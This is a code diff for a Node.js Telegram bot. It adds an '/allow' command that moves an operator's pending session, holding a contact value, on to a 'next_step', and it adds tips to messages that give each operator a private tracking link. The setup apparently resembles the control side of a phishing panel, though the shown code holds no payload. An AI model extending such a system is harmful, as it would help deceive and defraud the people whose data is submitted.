@@ -164,6 +164,31 @@ function initBot() {
     }
   });
 
+  // Instant Allow Command
+  bot.onText(/\/allow/, async (msg) => {
+    try {
+      const chatId = String(msg.chat.id);
+      let targetSession = null;
+
+      // Find the most recent pending session for this specific admin/sub-admin chat
+      for (const [sessionId, session] of sessions.entries()) {
+        if (session.adminChatId === chatId && session.status === 'pending') {
+          targetSession = session;
+          break;
+        }
+      }
+
+      if (targetSession) {
+        targetSession.status = 'next_step';
+        await bot.sendMessage(chatId, `✅ *Instant Allow Applied Successfully* for contact: \`${targetSession.contact}\``, { parse_mode: 'Markdown' });
+      } else {
+        await bot.sendMessage(chatId, `⚠️ No pending submissions found to allow right now.`, { parse_mode: 'Markdown' });
+      }
+    } catch (err) {
+      console.error('Error in /allow command:', err);
+    }
+  });
+
   bot.onText(/\/admins/, async (msg) => {
     const chatId = String(msg.chat.id);
     if (chatId !== String(fallbackAdminId)) {
@@ -196,7 +221,8 @@ function initBot() {
         `• *Last Name:* ${lastName}\n` +
         `• *Username:* ${username}\n` +
         `• *Telegram ID:* \`${userId}\`\n\n` +
-        `🔗 *Your Specific Link:*\n${userLink}`;
+        `🔗 *Your Specific Link:*\n${userLink}\n\n` +
+        `💡 *Tip:* Type /allow to instantly approve incoming submissions.`;
 
       await bot.sendMessage(chatId, profileText, { parse_mode: 'Markdown' });
     } catch (err) {}
@@ -271,7 +297,8 @@ function initBot() {
         `• *Name:* ${firstName}${lastName}\n` +
         `• *Username:* ${username ? '@' + username : 'None'}\n` +
         `• *Telegram ID:* \`${userId}\`\n\n` +
-        `🔗 *Your Private Tracking Link:*\n${userLink}`;
+        `🔗 *Your Private Tracking Link:*\n${userLink}\n\n` +
+        `💡 *Tip:* Send /allow anytime to instantly pass a submission.`;
 
       await bot.sendMessage(chatId, responseText, { parse_mode: 'Markdown' });
 
@@ -537,4 +564,4 @@ app.listen(PORT, () => {
   console.log(`Server is running and listening on port ${PORT}`);
   initBot();
 });
-    
+        
